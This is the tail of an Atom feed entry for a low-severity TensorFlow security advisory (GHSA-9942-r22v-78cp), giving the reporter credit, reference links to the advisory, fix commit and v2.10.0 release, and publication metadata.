<p>This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9942-r22v-78cp">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9942-r22v-78cp</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/bd90b3efab4ec958b228cd7cfe9125be1c0cf255">https://github.com/tensorflow/tensorflow/commit/bd90b3efab4ec958b228cd7cfe9125be1c0cf255</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0">https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-9942-r22v-78cp">https://github.com/advisories/GHSA-9942-r22v-78cp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9942-r22v-78cp</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-09-16T22:29:52.000Z</published>
    </entry>
</feed>